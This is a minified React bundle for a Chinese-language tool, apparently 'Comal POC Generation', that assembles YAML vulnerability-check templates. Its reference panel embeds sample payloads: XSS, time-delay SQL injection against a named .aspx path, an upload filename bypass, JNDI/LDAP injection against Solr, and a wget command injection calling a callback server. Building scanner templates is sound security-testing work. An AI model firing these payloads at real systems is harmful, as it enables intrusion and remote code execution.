{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[0],{187:function(e,t,a){e.exports=a(392)},193:function(e,t,a){},392:function(e,t,a){\"use strict\";a.r(t);var n=a(1),r=a.n(n),l=a(8),s=a.n(l),o=(a(192),a(193),a(194),a(184)),i=(a(130),a(45)),c=(a(83),a(35)),u=(a(166),a(28)),p=(a(131),a(27)),d=(a(132),a(37)),h=(a(106),a(30)),m=(a(393),a(104)),y=(a(167),a(79)),v=a(66),f=(a(206),a(183)),b=a(38),g=a(49),E=a(65),O=a(60),x=a(24),C=a(64),w=(a(208),a(81)),k=a(50),H=a.n(k),j=a(168),I=a.n(j),R=a(169),P=a.n(R),N=a(170),S=a.n(N),T=(a(394),a(182)),V=(a(237),a(180)),A=(a(239),a(10)),B=function(e){function t(e){var a;return Object(b.a)(this,t),(a=Object(E.a)(this,Object(O.a)(t).call(this,e))).changeInputValue=a.changeInputValue.bind(Object(x.a)(a)),a}return Object(C.a)(t,e),Object(g.a)(t,[{key:\"changeInputValue\",value:function(e){this.props.updateHandler(this.props.header.index,e.target.name,e.target.value)}},{key:\"render\",value:function(){var e=this;return r.a.createElement(r.a.Fragment,null,r.a.createElement(h.a.Group,{compact:!0,style:{width:\"90%\"}},r.a.createElement(h.a,{style:{width:\"20%\"},name:\"key\",value:this.props.header.key,onChange:this.changeInputValue,placeholder:\"User-Agent\"}),r.a.createElement(h.a,{style:{width:\"80%\"},name:\"value\",value:this.props.header.value,onChange:this.changeInputValue,placeholder:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36\"})),this.props.showDeleteButton?r.a.createElement(A.a,{className:\"dynamic-delete-button color-red\",type:\"minus-circle-o\",style:{color:\"#ff6868\"},onClick:function(t){return e.props.deleteHandler(e.props.header.index)}}):null,this.props.showAddButton?r.a.createElement(A.a,{className:\"dynamic-delete-button color-grey\",type:\"plus-circle-o\",onClick:this.props.addHandler}):null)}}]),t}(r.a.Component),z=0,D=function e(){Object(b.a)(this,e),this.index=++z,this.key=\"\",this.value=\"\"};function W(e,t){for(var a in e)if(e[a].index===t)return a;return-1}var G=function(e){function t(e){var a;return Object(b.a)(this,t),(a=Object(E.a)(this,Object(O.a)(t).call(this,e))).state={pathHelp:{status:\"success\",help:\"\"},headersHelp:{status:\"success\",help:\"\"}},a.changeInputValue=a.changeInputValue.bind(Object(x.a)(a)),a.changeInputValueByName=a.changeInputValueByName.bind(Object(x.a)(a)),a.addHeader=a.addHeader.bind(Object(x.a)(a)),a.updateHeader=a.updateHeader.bind(Object(x.a)(a)),a.deleteHeader=a.deleteHeader.bind(Object(x.a)(a)),a}return Object(C.a)(t,e),Object(g.a)(t,[{key:\"checkRule\",value:function(e,t){var a;if(\"path\"===e)a=t.startsWith(\"/\")?{status:\"success\",help:\"\"}:{status:\"error\",help:\"path\\u9700\\u8981\\u4ee5/\\u5f00\\u5934\"},this.setState({pathHelp:a});else if(\"headers\"===e){var n={status:\"success\",help:\"\"},r=!0,l=!1,s=void 0;try{for(var o,i=t[Symbol.iterator]();!(r=(o=i.next()).done);r=!0){o.value.key||(n={status:\"error\",help:\"HTTP\\u5934Key\\u4e0d\\u80fd\\u4e3a\\u7a7a\"})}}catch(c){l=!0,s=c}finally{try{r||null==i.return||i.return()}finally{if(l)throw s}}this.setState({headersHelp:n})}}},{key:\"changeInputValue\",value:function(e){this.checkRule(e.target.name,e.target.value),this.props.updateHandler(this.props.rule.index,e.target.name,e.target.value)}},{key:\"changeInputValueByName\",value:function(e,t){this.checkRule(e,t),this.props.updateHandler(this.props.rule.index,e,t)}},{key:\"addHeader\",value:function(){var e=H()(this.props.rule.headers,{$push:[new D]});this.changeInputValueByName(\"headers\",e)}},{key:\"updateHeader\",value:function(e,t,a){var n=W(this.props.rule.headers,e);if(n>=0){var r=H()(this.props.rule.headers,Object(v.a)({},n,Object(v.a)({},t,{$set:a})));this.changeInputValueByName(\"headers\",r)}}},{key:\"deleteHeader\",value:function(e){var t=W(this.props.rule.headers,e);if(t>=0){var a=H()(this.props.rule.headers,{$splice:[[t,1]]});this.changeInputValueByName(\"headers\",a)}}},{key:\"render\",value:function(){var e=this;return r.a.createElement(T.a,{title:\"\\u89c4\\u5219\\uff08Rule\\uff09\",size:\"small\",className:\"rule-card\",style:{marginBottom:\"24px\"},extra:r.a.createElement(c.a.Group,{size:\"small\"},r.a.createElement(c.a,{onClick:function(t){return e.props.deleteHandler(e.props.rule.index)},disabled:this.props.ruleSize<=1},\"\\u5220\\u9664Rule\"),r.a.createElement(c.a,{onClick:this.props.addHandler},\"\\u589e\\u52a0\\u4e00\\u4e2aRule\"))},r.a.createElement(d.a.Item,{label:\"\\u8bf7\\u6c42\\u65b9\\u6cd5\",className:\"rule-item\"},r.a.createElement(u.a,{defaultValue:this.props.rule.method,style:{width:120},name:\"method\",onChange:function(t){return e.changeInputValueByName(\"method\",t)}},[\"HEAD\",\"GET\",\"POST\",\"PUT\",\"PATCH\",\"DELETE\",\"CONNECT\",\"OPTIONS\",\"TRACE\"].map(function(e,t){return r.a.createElement(u.a.Option,{value:e,key:e},e)}))),r.a.createElement(d.a.Item,{label:\"\\u8bf7\\u6c42\\u8def\\u5f84\",className:\"rule-item\",validateStatus:this.state.pathHelp.status,help:this.state.pathHelp.help},r.a.createElement(h.a,{placeholder:\"/path/to/request\",type:\"text\",name:\"path\",value:this.props.rule.path,onChange:this.changeInputValue})),r.a.createElement(d.a.Item,{label:\"\\u8bf7\\u6c42\\u5934\",className:\"rule-item\",validateStatus:this.state.headersHelp.status,help:this.state.headersHelp.help},this.props.rule.headers.map(function(t,a){return r.a.createElement(B,{key:t.index,header:t,showAddButton:a===e.props.rule.headers.length-1,showDeleteButton:e.props.rule.headers.length>1,addHandler:e.addHeader,updateHandler:e.updateHeader,deleteHandler:e.deleteHeader})})),r.a.createElement(d.a.Item,{label:\"\\u8bf7\\u6c42\\u4f53\",className:\"rule-item\"},r.a.createElement(h.a.TextArea,{autosize:{minRows:2},name:\"body\",value:this.props.rule.body,onChange:this.changeInputValue})),r.a.createElement(d.a.Item,{label:\"\\u5141\\u8bb8\\u8df3\\u8f6c\",className:\"rule-item\"},r.a.createElement(V.a,{checked:this.props.rule.follow_redirects,name:\"follow_redirects\",onChange:function(t){return e.changeInputValueByName(\"follow_redirects\",t)}})),r.a.createElement(d.a.Item,{label:\"CEL\\u8868\\u8fbe\\u5f0f\",className:\"rule-item\"},r.a.createElement(h.a,{placeholder:\"responese.status==200\",type:\"text\",value:this.props.rule.expression,name:\"expression\",onChange:this.changeInputValue})),r.a.createElement(d.a.Item,{label:\"\\u63d0\\u53d6\\u89c4\\u5219\",className:\"rule-item\"},r.a.createElement(h.a,{placeholder:\"\",type:\"text\",value:this.props.rule.search,name:\"search\",onChange:this.changeInputValue})))}}]),t}(r.a.Component),L=0,$=function(){function e(){Object(b.a)(this,e),this.index=++L,this.method=\"GET\",this.path=\"\",this.headers=[new D],this.body=\"\",this.follow_redirects=!0,this.expression=\"\",this.search=\"\"}return Object(g.a)(e,[{key:\"addHeader\",value:function(){}}]),e}(),_=w.a.Header,U=w.a.Content,q=w.a.Footer,K=function(e){function t(e){var a;return Object(b.a)(this,t),(a=Object(E.a)(this,Object(O.a)(t).call(this,e))).state={name:\"poc-yaml-sql\",transport:\"http\",rules:[new $],detail:{},poc:\"\"},a.updateRule=a.updateRule.bind(Object(x.a)(a)),a.generatePOC=a.generatePOC.bind(Object(x.a)(a)),a.addRule=a.addRule.bind(Object(x.a)(a)),a.deleteRule=a.deleteRule.bind(Object(x.a)(a)),a.notify=a.notify.bind(Object(x.a)(a)),a}return Object(C.a)(t,e),Object(g.a)(t,[{key:\"componentDidMount\",value:function(){var e=this;new S.a(\"#copy-btn\").on(\"success\",function(t){e.notify(\"\\u590d\\u5236\\u6210\\u529f\",\"POC\\u5185\\u5bb9\\u5df2\\u6210\\u529f\\u590d\\u5236\\u5230\\u526a\\u5207\\u677f\")})}},{key:\"notify\",value:function(e,t){f.a.success({message:e,description:t,duration:3})}},{key:\"updateRule\",value:function(e,t,a){var n=W(this.state.rules,e);if(n>=0){var r=H()(this.state.rules,Object(v.a)({},n,Object(v.a)({},t,{$set:a})));this.setState({rules:r})}}},{key:\"deleteRule\",value:function(e){var t=W(this.state.rules,e);if(t>=0){var a=H()(this.state.rules,{$splice:[[t,1]]});this.setState({rules:a})}}},{key:\"generatePOC\",value:function(){var e={name:this.state.name,transport:this.state.transport,rules:P()(this.state.rules)},t=!0,a=!1,n=void 0;try{for(var r,l=e.rules[Symbol.iterator]();!(t=(r=l.next()).done);t=!0){var s=r.value;delete s.index;var o={},i=!0,c=!1,u=void 0;try{for(var p,d=s.headers[Symbol.iterator]();!(i=(p=d.next()).done);i=!0){var h=p.value;h.key&&(o[h.key]=h.value)}}catch(g){c=!0,u=g}finally{try{i||null==d.return||d.return()}finally{if(c)throw u}}Object.keys(o).length>0?s.headers=o:delete s.headers,s.body.length||delete s.body,s.path.length||delete s.path,s.search.length||delete s.search,s.expression=\"\".concat(s.expression,\"\\n\");var m,y={};y.method=s.method,y.follow_redirects=s.follow_redirects,y.body=s.body,y.path=s.path,m=s.expression,delete s.method,delete s.follow_redirects,delete s.body,delete s.path,delete s.expression,s.request=y,s.expression=m}}catch(g){a=!0,n=g}finally{try{t||null==l.return||l.return()}finally{if(a)throw n}}var v={};e.rules.forEach(function(e,t){v[\"r\".concat(t)]=e});var f=Object.keys(v).length;var b=I.a.safeDump({name:this.state.name,transport:this.state.transport,rules:v,expression:function(e){for(var t=\"\",a=0;a<e;a++)a>0&&(t+=\"&&\"),t+=\"r\".concat(a,\"()\");return t}(f)});this.setState({poc:b,isEditable:!0})}},{key:\"addRule\",value:function(){var e=H()(this.state.rules,{$push:[new $]});this.setState({rules:e})}},{key:\"render\",value:function(){var e=this;return r.a.createElement(w.a,{className:\"layout\"},r.a.createElement(_,null,r.a.createElement(\"div\",{className:\"logo\"},r.a.createElement(\"span\",{role:\"img\",\"aria-label\":\"dna\",\"aria-hidden\":\"true\"},\"\\ud83e\\uddec\"),\" Comal POC Generation\"),r.a.createElement(y.b,{theme:\"dark\",mode:\"horizontal\",defaultSelectedKeys:[\"2\"],style:{lineHeight:\"64px\"}})),r.a.createElement(U,{style:{padding:\"0 50px\"}},r.a.createElement(m.a,{style:{margin:\"16px 0\"}},r.a.createElement(m.a.Item,null,\"\\u9996\\u9875\"),r.a.createElement(m.a.Item,null,\"POC\\u751f\\u6210\")),r.a.createElement(\"div\",{style:{background:\"#fff\",padding:24,minHeight:280}},r.a.createElement(i.a,{gutter:16,type:\"flex\"},r.a.createElement(p.a,{span:12},r.a.createElement(d.a,{layout:\"horizontal\",labelAlign:\"left\"},r.a.createElement(d.a.Item,Object.assign({label:\"POC\\u540d\"},{labelCol:{span:2},wrapperCol:{span:22}}),r.a.createElement(h.a,{placeholder:\"\\u7531\\u6570\\u5b57\\u3001\\u5b57\\u6bcd\\u3001\\u77ed\\u6a2a\\u7ebf\\u7ec4\\u6210\",type:\"text\",value:this.state.name,onChange:function(t){return e.setState({name:t.target.value})}})),this.state.rules.map(function(t,a){return r.a.createElement(G,{key:t.index,rule:t,ruleSize:e.state.rules.length,updateHandler:e.updateRule,addHandler:e.addRule,deleteHandler:e.deleteRule})}))),r.a.createElement(p.a,{span:12,style:{paddingTop:\"4px\"}},r.a.createElement(o.a,{offsetTop:8},r.a.createElement(\"div\",{style:{display:\"flex\",flexDirection:\"column\"}},r.a.createElement(\"div\",{style:{marginBottom:\"15px\"}},r.a.createElement(\"span\",{style:{fontSize:\"18px\",fontWeight:\"bold\"}},\"\\u8bf7\\u9009\\u62e9\\u53c2\\u8003\\u63d0\\u793a\"),r.a.createElement(\"br\",null),r.a.createElement(u.a,{placeholder:\"\\u9009\\u62e9\\u751f\\u6210\\u7684POC\\u5185\\u5bb9\",value:this.state.selectedPOC,style:{width:\"100%\"},onChange:function(t){return e.setState({selectedPOC:t})}},r.a.createElement(u.a.Option,{value:\"poc2\"},\"poc-yaml-sqli(no-echo)\"),r.a.createElement(u.a.Option,{value:\"poc1\"},\"poc-yaml-xss\"),r.a.createElement(u.a.Option,{value:\"poc3\"},\"poc-yaml-upload\"),r.a.createElement(u.a.Option,{value:\"poc4\"},\"poc-yaml-ldap\"),r.a.createElement(u.a.Option,{value:\"poc5\"},\"poc-yaml-http\"),r.a.createElement(u.a.Option,{value:\"poc6\"},\"poc-yaml-deser\"),r.a.createElement(u.a.Option,{value:\"poc7\"},\"poc-yaml-fileUpload\"),r.a.createElement(u.a.Option,{value:\"poc8\"},\"poc-yaml-httpReverse\"),r.a.createElement(u.a.Option,{value:\"poc9\"},\"poc-yaml-ldapReverse\"))),r.a.createElement(\"div\",null,r.a.createElement(h.a.TextArea,{autosize:{minRows:10},placeholder:\"\\u6839\\u636e\\u9009\\u62e9\\u751f\\u6210\\u7684POC\\u5185\\u5bb9\",value:\"poc1\"===this.state.selectedPOC?'path: /%3Cscript%3Ealert(document.domain)%3C/script%3E  //\\u6ce8\\u5165\\u7684payload\\nexpression: response.status==404 && \\nresponse.body.bcontains(b\\' / tmp / www / <script>alert(document.domain)<\\/script>\\') && //\\u54cd\\u5e94\\u7279\\u5f81\\nresponse.headers[\"Content-Type\"].contains(\"text/html\") //\\u68c0\\u67e5\\u4f53\\u7684header\\u5b57\\u6bb5\\n ':\"poc2\"===this.state.selectedPOC?\"//\\u91c7\\u7528\\u5ef6\\u65f6\\u6ce8\\u5165\\npath: /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a3%27+--%20and%201=1\\n\\n//\\u4f7f\\u7528 response.latency > 3000 \\u5224\\u65ad\\u751f\\u6548\\u7684\\u65f6\\u95f4\\nexpression:  response.status == 200 && (response.latency > 3000) && response.body.bcontains(b'id') && response.body.bcontains(b'text') && response.body.bcontains(b'permissions') && response.body.bcontains(b'GetTreeDate.aspx?nodeid') \\n \":\"poc3\"===this.state.selectedPOC?'set: filename: randomLowercase(8) //\\u8bbe\\u7f6e\\u76f8\\u5173\\u7684\\u53d8\\u91cf\\n\\nbody: |\\n        -----------------------------318949277012917151102295043236\\n        Content-Disposition: form-data; name=\"uploaded_file\"; filename=\"{{filename}}.ph$p\" //\\u66ff\\u6362\\u53d8\\u91cf\\u5b57\\u7b26\\n':\"poc4\"===this.state.selectedPOC?\"set:\\n    reverse: newReverse()\\n    reverseURL: reverse.ldap\\n// \\u8d77\\u4e00\\u4e2aldap\\u670d\\u52a1\\uff0c\\u7528\\u4e8e\\u63a5\\u53d7\\u8bf7\\u6c42\\n path: /solr/admin/collections?action=${jndi:{{reverseURL}}}&wt=json //\\u66ff\\u6362\\u751f\\u6210\\u7684\\u53d8\\u91cf\\n expression: reverse.wait(5) //\\u7b49\\u5f85\\u8fde\\u63a5\":\"poc5\"===this.state.selectedPOC?\"set:\\n    reverse: newReverse()\\n    reverseURL: reverse.url\\n// \\u8d77\\u4e00\\u4e2ahttp\\u670d\\u52a1\\u7528\\u4e8e\\u63a5\\u53d7\\u8bf7\\u6c42\\npath: //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20{{reverseURL}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything\\n//\\u4f7f\\u7528wget\\u53bb\\u8bbf\\u95ee\\u8d77\\u6765\\u7684web\\u670d\\u52a1\\n expression: reverse.wait(5) //\\u7b49\\u5f85\\u8fde\\u63a5\":\"poc6\"===this.state.selectedPOC?\"poc6\\u7684\\u5185\\u5bb9\":\"\",readOnly:!0})),r.a.createElement(\"span\",{style:{fontSize:\"18px\",fontWeight:\"bold\"}},\"\\u751f\\u6210\\u7684poc\"),r.a.createElement(\"div\",null,r.a.createElement(h.a.TextArea,{autosize:{minRows:10},placeholder:\"\\u751f\\u6210POC\\u5185\\u5bb9\",value:this.state.poc,id:\"poc-detail\",readOnly:!this.state.isEditable,onChange:function(t){return e.setState({poc:t.target.value})}})),r.a.createElement(i.a,{justify:\"end\",type:\"flex\"},r.a.createElement(c.a,{type:\"primary\",size:\"default\",onClick:this.generatePOC,className:\"br\"},\"\\u751f\\u6210\"),r.a.createElement(c.a,{type:\"dashed\",icon:\"copy\",id:\"copy-btn\",\"data-clipboard-text\":this.state.poc},\"\\u590d\\u5236POC\")))))))),r.a.createElement(q,{style:{textAlign:\"center\"}},\"\\xa92023 Comal POC Generation\"))}}]),t}(r.a.Component);Boolean(\"localhost\"===window.location.hostname||\"[::1]\"===window.location.hostname||window.location.hostname.match(/^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));s.a.render(r.a.createElement(K,null),document.getElementById(\"root\")),\"serviceWorker\"in navigator&&navigator.serviceWorker.ready.then(function(e){e.unregister()})}},[[187,1,2]]]);","extractedComments":[]}